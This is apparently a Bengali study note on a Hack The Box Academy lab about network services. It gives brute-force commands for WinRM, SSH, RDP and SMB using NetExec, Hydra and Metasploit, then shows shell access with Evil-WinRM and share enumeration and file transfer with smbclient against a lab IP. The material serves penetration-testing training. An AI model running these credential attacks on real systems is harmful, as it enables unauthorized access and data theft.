## Network Services - [LINK](https://academy.hackthebox.com/app/module/147/section/1327)


পেনিট্রেশন টেস্টিং করার সময় আমরা যতগুলো কম্পিউটার নেটওয়ার্ক দেখব, তার প্রতিটিতেই কোনো না কোনো সার্ভিস ইনস্টল করা থাকে। এই সার্ভিসগুলোর কাজ হলো কন্টেন্ট ম্যানেজ করা বা তৈরি করা। ওয়েব অ্যাপ্লিকেশন ছাড়াও বেশ কিছু পরিচিত নেটওয়ার্ক সার্ভিস হলো: FTP, SMB, NFS, IMAP/POP3, SSH, MySQL/MSSQL, RDP, WinRM, VNC ইত্যাদি।

ধরে নিন, আমরা একটি উইন্ডোজ সার্ভারকে নেটওয়ার্কের মাধ্যমে রিমোটলি কন্ট্রোল করতে চাই। এর জন্য আমাদের এমন একটি সার্ভিস লাগবে যা দিয়ে আমরা সার্ভারে কমান্ড রান করতে পারি বা গ্রাফিকাল ইন্টারফেস (GUI) দেখতে পারি। উইন্ডোজের জন্য সাধারণত **RDP** এবং **WinRM** ব্যবহৃত হয়। অন্যদিকে লিনাক্সভিত্তিক সিস্টেমের জন্য সবচেয়ে জনপ্রিয় হলো **SSH**।

এই প্রতিটি সার্ভিসে লগইন করার জন্য ইউজারনেম এবং পাসওয়ার্ড লাগে। অনেক সময় এগুলো ডিফল্ট বা খুব দুর্বল পাসওয়ার্ড দিয়ে সেট করা থাকে, যা আমরা হ্যাক বা ব্রুট-ফোর্স (Brute-force) করতে পারি।

## WinRM (Windows Remote Management)

WinRM হলো উইন্ডোজ সিস্টেমকে রিমোটলি ম্যানেজ বা কন্ট্রোল করার জন্য মাইক্রোসফটের একটি প্রোটোকল। এটি SOAP (Simple Object Access Protocol) নামের একটি XML ওয়েব সার্ভিসের ওপর ভিত্তি করে কাজ করে।

নিরাপত্তার জন্য Windows 10/11 এ এটি ম্যানুয়ালি চালু করতে হয়। ডিফল্টভাবে WinRM নিচের পোর্টগুলো ব্যবহার করে:

* TCP পোর্ট 5985 (HTTP)
* TCP পোর্ট 5986 (HTTPS)

পাসওয়ার্ড অ্যাটাক বা ব্রুট-ফোর্স করার জন্য **NetExec** নামের একটি টুল খুবই জনপ্রিয়। এটি শুধু WinRM নয়, SMB, LDAP, MSSQL ইত্যাদির ক্ষেত্রেও কাজ করে।

### NetExec

**NetExec ইনস্টলেশন:**
উবুন্টু বা কালিতে এটি খুব সহজেই apt দিয়ে ইনস্টল করা যায়:

```bash
sudo apt-get -y install netexec

```

**NetExec এর মেনু এবং অপশন দেখা:**
টুলটি কীভাবে ব্যবহার করতে হয় তা দেখতে `-h` ফ্ল্যাগ ব্যবহার করা হয়:

```bash
netexec -h

```

এখানে আপনি বিভিন্ন প্রোটোকল দেখতে পাবেন (যেমন: nfs, ftp, ssh, winrm, smb, rdp ইত্যাদি)।

নির্দিষ্ট কোনো প্রোটোকলের জন্য বিস্তারিত সাহায্য পেতে চাইলে সেই প্রোটোকলের নাম লিখে `-h` দিতে হয়। যেমন SMB এর জন্য:

```bash
netexec smb -h

```

**NetExec এর ব্যবহার (Usage):**
এর সাধারণ ফরম্যাট হলো:

```bash
netexec <protocol> <target-IP> -u <user or userlist> -p <password or passwordlist>

```

WinRM পোর্টে অ্যাটাক করার একটি উদাহরণ:

```bash
netexec winrm 10.129.42.197 -u user.list -p password.list

```

**আউটপুট:**

```text
WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)

```

আউটপুটে **`(Pwn3d!)`** লেখা দেখার মানে হলো, আমরা সঠিক ইউজারনেম ও পাসওয়ার্ড খুঁজে পেয়েছি এবং এই সিস্টেমটি হ্যাক করা সম্ভব!

### Evil-WinRM

NetExec দিয়ে পাসওয়ার্ড পাওয়ার পর, সার্ভারে লগইন করে সরাসরি একটি টার্মিনাল বা শেল (Shell) পাওয়ার জন্য **Evil-WinRM** ব্যবহার করা হয়।

**Evil-WinRM ইনস্টলেশন:**

```bash
sudo gem install evil-winrm

```

**Evil-WinRM এর ব্যবহার:**
সঠিক আইপি, ইউজারনেম এবং পাসওয়ার্ড দিয়ে লগইন করার কমান্ড:

```bash
evil-winrm -i 10.129.42.197 -u user -p password

```

লগইন সফল হলে আপনি সরাসরি উইন্ডোজের Powershell টার্মিনাল পেয়ে যাবেন, যেখান থেকে যেকোনো কমান্ড রান করা যাবে।

## SSH (Secure Shell)

রিমোট হোস্ট বা সার্ভারে কানেক্ট করে কমান্ড রান করানো বা ফাইল ট্রান্সফার করার একটি অত্যন্ত সুরক্ষিত মাধ্যম হলো SSH। এটি ডিফল্টভাবে **TCP পোর্ট 22** ব্যবহার করে। SSH এর সিকিউরিটির পেছনে মূলত তিনটি ক্রিপ্টোগ্রাফি মেথড কাজ করে:

1. **Symmetric Encryption:** এনক্রিপ্ট এবং ডিক্রিপ্ট করার জন্য একই চাবি (Key) ব্যবহার করা হয়।
2. **Asymmetric Encryption:** এখানে দুটি চাবি থাকে— একটি Private Key (যা গোপন থাকে) এবং একটি Public Key (যা সার্ভারের কাছে থাকে)।
3. **Hashing:** ট্রান্সফার করা ডাটা রাস্তায় কেউ পরিবর্তন করেছে কিনা, তা যাচাই করার জন্য হ্যাশিং ব্যবহৃত হয়।

**Hydra দিয়ে SSH পাসওয়ার্ড অ্যাটাক (Brute-forcing):**
Hydra হলো পাসওয়ার্ড ব্রুট-ফোর্স করার একটি দারুণ টুল।

```bash
hydra -L user.list -P password.list ssh://10.129.42.197

```

এখানে `-L` দিয়ে ইউজারনেমের লিস্ট এবং `-P` দিয়ে পাসওয়ার্ডের লিস্ট দেওয়া হয়েছে।

**SSH এ লগইন করা:**
পাসওয়ার্ড পেয়ে গেলে লিনাক্সের ডিফল্ট OpenSSH ক্লায়েন্ট দিয়ে লগইন করা যায়:

```bash
ssh user@10.129.42.197

```

প্রথমবার কানেক্ট করার সময় এটি ফিঙ্গারপ্রিন্ট সেভ করার অনুমতি চাইবে (yes লিখতে হবে), এরপর পাসওয়ার্ড দিলেই আপনি সার্ভারের ভেতরে ঢুকে যাবেন।

## Remote Desktop Protocol (RDP)

RDP হলো মাইক্রোসফটের এমন একটি প্রোটোকল যা দিয়ে উইন্ডোজ সিস্টেমের গ্রাফিকাল ইউজার ইন্টারফেস (GUI) রিমোটলি ব্যবহার করা যায়। এটি ডিফল্টভাবে **TCP পোর্ট 3389** ব্যবহার করে। এর সাহায্যে দূর থেকে স্ক্রিন দেখা, মাউস ও কীবোর্ড চালানো এমনকি প্রিন্টও করা যায়।

**Hydra দিয়ে RDP পাসওয়ার্ড অ্যাটাক:**

```bash
hydra -L user.list -P password.list rdp://10.129.42.197

```

**xFreeRDP দিয়ে কানেক্ট করা:**
লিনাক্স থেকে উইন্ডোজের RDP তে কানেক্ট করার জন্য `xfreerdp` একটি চমৎকার টুল।

```bash
xfreerdp /v:10.129.42.197 /u:user /p:password

```

এটি রান করার পর একটি উইন্ডো ওপেন হবে যেখানে আপনি উইন্ডোজের স্ক্রিন দেখতে পাবেন।

## SMB (Server Message Block)

লোকাল নেটওয়ার্কে ফাইল, ডিরেক্টরি এবং প্রিন্টার শেয়ার করার জন্য SMB ব্যবহৃত হয়। অনেকে একে ফাইল সিস্টেম ভাবলেও, এটি আসলে তা নয়। এটি CIFS (Common Internet File System) নামেও পরিচিত। লিনাক্সে এই একই সুবিধা পাওয়ার জন্য ওপেন-সোর্স **Samba** ব্যবহার করা হয়।

**Hydra দিয়ে SMB পাসওয়ার্ড অ্যাটাক:**

```bash
hydra -L user.list -P password.list smb://10.129.42.197

```

**Hydra এর একটি কমন সমস্যা (Error):**
অনেক সময় পুরনো ভার্সনের Hydra আধুনিক SMBv3 প্রোটোকল বুঝতে পারে না। তখন নিচের মতো একটি এরর আসে:

```text
[ERROR] invalid reply from target smb://10.129.42.197:445/

```

এই সমস্যা সমাধানের জন্য আমরা মেটাসপ্লয়েট (Metasploit Framework) ব্যবহার করতে পারি।

### Metasploit Framework দিয়ে SMB লগইন বাইপাস:

টার্মিনালে `msfconsole -q` লিখে মেটাসপ্লয়েট চালু করুন। এরপর নিচের কমান্ডগুলো দিন:

```bash
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list
msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197
msf6 auxiliary(scanner/smb/smb_login) > run

```

এটি নিজে নিজেই ব্রুট-ফোর্স করে আপনাকে সঠিক ইউজারনেম ও পাসওয়ার্ড বের করে দেবে।

### NetExec দিয়ে শেয়ার ফোল্ডার খোঁজা (Enumeration)

সঠিক পাসওয়ার্ড পাওয়ার পর, ওই সার্ভারে কী কী ফোল্ডার শেয়ার করা আছে এবং সেগুলোতে আমাদের পড়ার বা লেখার পারমিশন আছে কিনা, তা দেখতে NetExec ব্যবহার করা যায়:

```bash
netexec smb 10.129.42.197 -u "user" -p "password" --shares

```

আউটপুটে এটি ফোল্ডারের নাম এবং পারমিশন (যেমন: READ, WRITE) দেখাবে।

### Smbclient দিয়ে শেয়ার ফোল্ডারে ঢোকা

শেয়ার করা কোনো ফোল্ডার বা ডিরেক্টরির ভেতরে ঢুকে ফাইল দেখতে বা ডাউনলোড/আপলোড করতে `smbclient` ব্যবহার করা হয়:

```bash
smbclient -U user \\\\10.129.42.197\\SHARENAME

```

পাসওয়ার্ড দেওয়ার পর এটি আপনাকে একটি `smb: \>` প্রম্পট দেবে, যেখানে আপনি `ls` কমান্ড দিয়ে ফাইল দেখতে পারবেন এবং `get` বা `put` কমান্ড দিয়ে ফাইল আদান-প্রদান করতে পারবেন।
